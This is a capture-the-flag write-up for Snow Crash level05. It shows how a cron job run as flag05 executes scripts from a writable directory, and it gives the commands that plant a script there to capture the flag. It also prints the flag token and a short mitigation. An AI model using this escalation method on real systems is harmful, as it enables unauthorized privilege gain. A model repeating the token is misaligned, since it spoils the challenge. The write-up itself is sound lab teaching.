# Level05 - Snow Crash Exploit

## Description

While exploring the `level05` environment, I discovered a file owned by `flag05` using:

```bash
find / -user flag05 2> /dev/null
```

This revealed `/usr/sbin/openarenaserver`, a shell script with the following content:

```sh
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

The script executes every file in `/opt/openarenaserver/` with a CPU time limit, then deletes it.

## Privilege Escalation Path

- The `/opt/openarenaserver/` directory is writable by `level05`.
- Direct execution of `/usr/sbin/openarenaserver` is not permitted due to insufficient permissions.
- Using `find / -name level05 2> /dev/null`, I found `/var/mail/level05`, which contains:
  ```
  */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
  ```
- This cron job runs `/usr/sbin/openarenaserver` as `flag05` every 2 minutes.

## Exploitation Steps

1. **Create a Malicious Script in `/opt/openarenaserver/`:**

    ```bash
    echo '/bin/getflag > /tmp/flag05' > /opt/openarenaserver/getflag05
    ```

2. **Wait for the Cron Job to Execute:**

    The cron job will run the script as `flag05` within 2 minutes, executing `getflag` and saving the output to `/tmp/flag05`.

3. **Retrieve the Flag:**

    ```bash
    cat /tmp/flag05
    ```

    Output:
    ```
    Check flag.Here is your token : viuaaale9huek52boumoomioc
    ```

## Mitigation

To prevent this vulnerability:
- Do not execute scripts from world-writable directories as privileged users.
- Use secure directories with proper permissions for scripts executed by cron